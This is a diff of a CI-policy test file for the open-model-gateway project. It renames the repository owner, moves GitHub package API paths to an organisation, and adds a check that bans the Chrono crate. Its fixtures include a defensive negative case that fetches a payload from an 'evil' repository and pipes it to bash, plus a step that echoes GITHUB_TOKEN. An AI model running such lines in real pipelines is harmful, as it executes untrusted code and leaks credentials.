@@ -227,8 +227,8 @@ const LOCAL_PROBE = /^[ \t]*curl --fail --silent --show-error --cacert \.local\/
 // file: listing and deleting this repository's own container package versions.
 const GH_API_FILES = new Set([".github/workflows/prune-dev-images.yml"]);
 const GH_API_ALLOWED = [
-  /gh api --paginate "\/users\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
-  /gh api -X DELETE "\/users\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
+  /gh api --paginate "\/orgs\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
+  /gh api -X DELETE "\/orgs\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
 ];
 
 // Constructs that hide what runs. The check above is a guard against accidental,
@@ -1449,7 +1449,7 @@ const probeStep = (data, job, name) => {
 const PROBE_GUARD = [
   "set -euo pipefail",
   '[[ "${EVENT}" = workflow_dispatch && "${PROBE}" = true ]]',
-  '[[ "${GITHUB_REPOSITORY}" = ncecere/open-model-gateway && "${IMAGE}" = ghcr.io/ncecere/open-model-gateway ]]',
+  '[[ "${GITHUB_REPOSITORY}" = bitop-dev/open-model-gateway && "${IMAGE}" = ghcr.io/bitop-dev/open-model-gateway ]]',
   '[[ "${REF_TYPE}" = branch && "${GITHUB_REF}" = refs/heads/?* && "${GITHUB_REF}" != refs/heads/main ]]',
   '[[ "${GITHUB_SHA}" =~ ^[0-9a-f]{40}$ && "${GITHUB_WORKFLOW_SHA}" = "${GITHUB_SHA}" ]]',
 ].join("\n");
@@ -1476,7 +1476,7 @@ function assertProbePolicy(data) {
   } });
   assert.equal(data.on.workflow_call.inputs, undefined, "reusable callers cannot activate the probe");
   assert.equal(data.jobs.meta.if, PROBE_META_IF);
-  assert.deepEqual(data.env, { IMAGE: "ghcr.io/ncecere/open-model-gateway" });
+  assert.deepEqual(data.env, { IMAGE: "ghcr.io/bitop-dev/open-model-gateway" });
   for (const name of ["probe-prepare", "probe-sign", "probe-verify"]) {
     const job = data.jobs[name];
     assert.ok(job, `${name} must exist`);
@@ -1596,7 +1596,7 @@ test("probe boundary policy rejects widened inputs, authority, handoffs, optiona
       d => { step(d, job, "Remove probe credentials").if = "success()"; },
       d => { step(d, job, "Remove probe credentials").run = "docker logout ghcr.io"; },
       d => { step(d, job, "Authenticate privately with native Docker").run += '\necho "${GITHUB_TOKEN}"'; },
-      d => { d.jobs[job].steps.push({ run: "docker push ghcr.io/ncecere/open-model-gateway:latest-release" }); },
+      d => { d.jobs[job].steps.push({ run: "docker push ghcr.io/bitop-dev/open-model-gateway:latest-release" }); },
     ]),
     d => { d.jobs["probe-prepare"].permissions.packages = "write"; },
     d => { d.jobs["probe-verify"].permissions["id-token"] = "write"; },
@@ -1636,7 +1636,7 @@ function probeFixture() {
     GITHUB_ENV: join(dir, "env"), GITHUB_OUTPUT: join(dir, "output"),
     EVENT: "workflow_dispatch", PROBE: "true", REF_TYPE: "branch",
     GITHUB_REF: "refs/heads/issue/375-signing-acceptance", GITHUB_SHA: "a".repeat(40), GITHUB_WORKFLOW_SHA: "a".repeat(40),
-    GITHUB_REPOSITORY: "ncecere/open-model-gateway", IMAGE: "ghcr.io/ncecere/open-model-gateway", GITHUB_ACTOR: "probe-fixture",
+    GITHUB_REPOSITORY: "bitop-dev/open-model-gateway", IMAGE: "ghcr.io/bitop-dev/open-model-gateway", GITHUB_ACTOR: "probe-fixture",
     DIGEST: `sha256:${"b".repeat(64)}`, CHILD: `sha256:${"c".repeat(64)}`,
     FIXTURE_DIR: dir,
     REPORTED_VERSION: `open-model-gateway ${readFileSync(join(root, "apps/gateway/Cargo.toml"), "utf8").match(/^version = "([^"]+)"$/m)[1]}`,
@@ -2101,7 +2101,7 @@ function assertPublicationGraph(flows) {
       assert.equal(call.with.source_revision, { image: "${{ github.sha }}", "branch-images": `\${{ needs.build.outputs.source_revision_linux_${arch} }}` }[name] ?? "${{ needs.build.outputs.source_revision }}");
       assert.match(call.with.artifact_id, /^\$\{\{ needs\.build\.outputs\.artifact_id(?:_linux_(?:amd64|arm64))? \}\}$/);
       assert.match(call.with.root_digest, /^\$\{\{ needs\.build\.outputs\.digest(?:_linux_(?:amd64|arm64))? \}\}$/);
-      assert.equal(call.with.image_repository, `ghcr.io/ncecere/open-model-gateway${name === "loadtest-image" ? "-loadtest" : ""}`);
+      assert.equal(call.with.image_repository, `ghcr.io/bitop-dev/open-model-gateway${name === "loadtest-image" ? "-loadtest" : ""}`);
     }
     for (const [jobName, job] of jobsOf(data).filter(([, j]) => j.steps && hasWrite(j.permissions))) {
       assert.doesNotMatch(executable(job), /docker (?:build|run|pull)\b|staging\.py|trivy|cargo|npm|oci-layout/);
@@ -2135,7 +2135,7 @@ function assertPublicationGraph(flows) {
     assert.deepEqual(image.jobs[`import-${arch}`].with, {
       artifact_id: `\${{ needs.build.outputs.artifact_id_linux_${arch} }}`,
       root_digest: `\${{ needs.build.outputs.digest_linux_${arch} }}`,
-      platform: `linux/${arch}`, image_repository: "ghcr.io/ncecere/open-model-gateway", source_revision: "${{ github.sha }}",
+      platform: `linux/${arch}`, image_repository: "ghcr.io/bitop-dev/open-model-gateway", source_revision: "${{ github.sha }}",
     });
   }
   assert.deepEqual(image.jobs.verify.strategy, { "fail-fast": true, matrix: { include: architectures.map(({ pair, ...a }) => ({
@@ -2187,14 +2187,14 @@ function assertPublicationGraph(flows) {
     assert.deepEqual(branch.jobs[`import-${arch}`].with, {
       artifact_id: `\${{ needs.build.outputs.artifact_id_linux_${arch} }}`,
       root_digest: `\${{ needs.build.outputs.digest_linux_${arch} }}`,
-      platform: `linux/${arch}`, image_repository: "ghcr.io/ncecere/open-model-gateway",
+      platform: `linux/${arch}`, image_repository: "ghcr.io/bitop-dev/open-model-gateway",
       source_revision: `\${{ needs.build.outputs.source_revision_linux_${arch} }}`,
     });
   }
   const branchPublish = branch.jobs.publish;
   assert.deepEqual(branchPublish.needs, ["build", "import-amd64", "import-arm64"]);
   assert.deepEqual(branchPublish.env, {
-    IMAGE: "ghcr.io/ncecere/open-model-gateway",
+    IMAGE: "ghcr.io/bitop-dev/open-model-gateway",
     DIGEST_AMD64: "${{ needs.import-amd64.outputs.digest }}", DIGEST_ARM64: "${{ needs.import-arm64.outputs.digest }}",
     SOURCE_REVISION: "${{ needs.build.outputs.source_revision_linux_amd64 }}", SOURCE_REVISION_ARM64: "${{ needs.build.outputs.source_revision_linux_arm64 }}",
   });
@@ -2250,7 +2250,7 @@ function assertPublicationGraph(flows) {
     assert.match(script, /inspect_archive/);
     assert.match(script, /org\.opencontainers\.image\.revision/);
     assert.match(script, /\^\[1-9\]\[0-9\]\*\$/);
-    assert.match(script, /ghcr\.io\/ncecere\/open-model-gateway\|ghcr\.io\/ncecere\/open-model-gateway-loadtest/);
+    assert.match(script, /ghcr\.io\/bitop-dev\/open-model-gateway\|ghcr\.io\/bitop-dev\/open-model-gateway-loadtest/);
     assert.doesNotMatch(script, /tar -x|GITHUB_PATH|docker|cargo|npm|trivy/);
   }
   const stage = imports.find(s => /oci-stage\.py/.test(s.run ?? ""));
@@ -2263,7 +2263,7 @@ function assertPublicationGraph(flows) {
 }
 
 function assertPublicationTagGuard(image) {
-  assert.deepEqual(image.env, { IMAGE: "ghcr.io/ncecere/open-model-gateway" });
+  assert.deepEqual(image.env, { IMAGE: "ghcr.io/bitop-dev/open-model-gateway" });
   const publish = image.jobs.publish;
   assertRequiredPublication(publish, ["Job summary", "Remove registry credentials"]);
   assert.equal(publish.env, undefined);
@@ -2351,7 +2351,7 @@ function nativeIndexFixture() {
   raced.manifests[0].digest = hash("different-valid-amd64");
   raced.manifests[1].annotations["vnd.docker.reference.digest"] = raced.manifests[0].digest;
   const env = { ...process.env, PATH: `${bin}:${process.env.PATH}`, RUNNER_TEMP: dir,
-    IMAGE: "ghcr.io/ncecere/open-model-gateway", FIXTURE_DIR: dir, GITHUB_OUTPUT: join(dir, "output") };
+    IMAGE: "ghcr.io/bitop-dev/open-model-gateway", FIXTURE_DIR: dir, GITHUB_OUTPUT: join(dir, "output") };
   for (const [file, value] of Object.entries({ amd, arm, index, raced })) {
     const raw = JSON.stringify(value);
     writeFileSync(join(dir, file + ".json"), raw);
@@ -2579,7 +2579,7 @@ function handoffFixture() {
     ...process.env, RUNNER_TEMP: dir, GITHUB_ENV: join(dir, "env"),
     IMAGE_DIR: join(dir, "image"), TOOL_DIR: join(dir, "tool"),
     ARTIFACT_ID: "123", TOOL_ARTIFACT_ID: "456", ROOT_DIGEST: `sha256:${"a".repeat(64)}`,
-    SOURCE_REVISION: "b".repeat(40), PLATFORM: "linux/amd64", IMAGE: "ghcr.io/ncecere/open-model-gateway",
+    SOURCE_REVISION: "b".repeat(40), PLATFORM: "linux/amd64", IMAGE: "ghcr.io/bitop-dev/open-model-gateway",
   };
   delete env.GITHUB_TOKEN;
   delete env.GH_TOKEN;
@@ -2595,13 +2595,13 @@ test("actual importer selector guards reject alternate repos, tags, platforms, r
   try {
     for (const name of ["preflight", "import"]) {
       const script = stepsOf(data.jobs[name]).find(s => s.name === "Refuse invalid handoff selectors before download").run;
-      for (const image of ["ghcr.io/ncecere/open-model-gateway", "ghcr.io/ncecere/open-model-gateway-loadtest"]) {
+      for (const image of ["ghcr.io/bitop-dev/open-model-gateway", "ghcr.io/bitop-dev/open-model-gateway-loadtest"]) {
         const good = fixture.run(script, { IMAGE: image });
         assert.equal(good.status, 0, good.stderr);
       }
       const bad = [
         ...["", "0", "01", "-1", "1,2", "1 2", "1\n2", "1e2", "latest"].map(ARTIFACT_ID => ({ ARTIFACT_ID })),
-        ...["ghcr.io/other/open-model-gateway", "ghcr.io/ncecere/open-model-gateway:latest", "ghcr.io/ncecere/open-model-gateway@sha256:x", "ghcr.io/ncecere/open-model-gateway/extra"].map(IMAGE => ({ IMAGE })),
+        ...["ghcr.io/ncecere/open-model-gateway", "ghcr.io/ncecere/open-model-gateway-loadtest", "ghcr.io/other/open-model-gateway", "ghcr.io/bitop-dev/open-model-gateway:latest", "ghcr.io/bitop-dev/open-model-gateway@sha256:x", "ghcr.io/bitop-dev/open-model-gateway/extra"].map(IMAGE => ({ IMAGE })),
         { PLATFORM: "linux/arm/v7" }, { PLATFORM: "linux/amd64,linux/arm64" },
         { ROOT_DIGEST: `sha256:${"A".repeat(64)}` }, { ROOT_DIGEST: "latest" },
         { SOURCE_REVISION: "main" }, { SOURCE_REVISION: "b".repeat(12) },
@@ -3000,11 +3000,11 @@ test("fixtures: downloads that skip the checksum script are caught", () => {
   for (const script of good) assert.deepEqual(downloadViolations("w.yml", script), [], script);
   // gh api is exempt only in prune-dev-images.yml and only in its two exact shapes.
   const prune = ".github/workflows/prune-dev-images.yml";
-  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/users/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
-  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`), []);
+  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/orgs/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
+  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/orgs/$OWNER/packages/container/$package/versions/$id"`), []);
   assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);
   assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content > p.sh").length);
-  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
+  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/orgs/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
 });
 
 // #475: v0.14.0 was tagged before anyone had scanned its image, and the tag run then
@@ -3204,7 +3204,7 @@ test("the runner check refuses floating, self-hosted, computed and unlisted runn
     ["a leg with an expression key", matrix([{ runner: "ubuntu-24.04", "${{ insert }}": "x" }]), /exactly one literal runner key/],
     ["a reusable call that also names a runner", { uses: "./.github/workflows/image.yml", "runs-on": "ubuntu-24.04" }, /must not name a runner/],
     ["a reusable workflow of another repository", { uses: `some-org/shared-ci/.github/workflows/lint.yml@${"0".repeat(40)}` }, /only a workflow file of this checkout/],
-    ["this repository at another commit", { uses: `ncecere/open-model-gateway/.github/workflows/image.yml@${"0".repeat(40)}` }, /only a workflow file of this checkout/],
+    ["this repository at another commit", { uses: `bitop-dev/open-model-gateway/.github/workflows/image.yml@${"0".repeat(40)}` }, /only a workflow file of this checkout/],
     ["a local workflow that does not exist", { uses: "./.github/workflows/missing.yml" }, /only a workflow file of this checkout/],
     ["a local path outside the workflows", { uses: "./.github/workflows/../../other/image.yml" }, /only a workflow file of this checkout/],
     ["a call without a target", { uses: null, steps }, /only a workflow file of this checkout/],
@@ -3337,4 +3337,18 @@ test("prune-dev-images deletes only old versions whose tags are all dev-<12 hex>
     assert.notEqual(mutated, text);
     assert.notDeepEqual(pruneSelection(mutated, PRUNE_FIXTURE), ["1", "2", "13"]);
   }
+});
+
+function assertNoChrono(lock) {
+  const sections = lock.match(/^\[\[package\]\]$/gm) ?? [];
+  const names = [...lock.matchAll(/^\[\[package\]\]\nname = "([^"]+)"$/gm)].map(match => match[1]);
+  assert.equal(names.length, sections.length, "every locked package must be inventoried");
+  assert.ok(names.length > 0);
+  assert.ok(!names.includes("chrono"), "Chrono is unmaintained; preserve the complete maintained date dependency graph (#674)");
+}
+
+test("the complete locked date dependency graph excludes Chrono, including inactive targets", () => {
+  assert.throws(() => assertNoChrono('[[package]]\nname = "chrono"\nversion = "0.4.45"\n'), /Chrono is unmaintained/);
+  assert.throws(() => assertNoChrono('[[package]]\n# hidden name\nname = "chrono"\n'), /every locked package/);
+  assertNoChrono(readFileSync(join(root, "Cargo.lock"), "utf8"));
 });
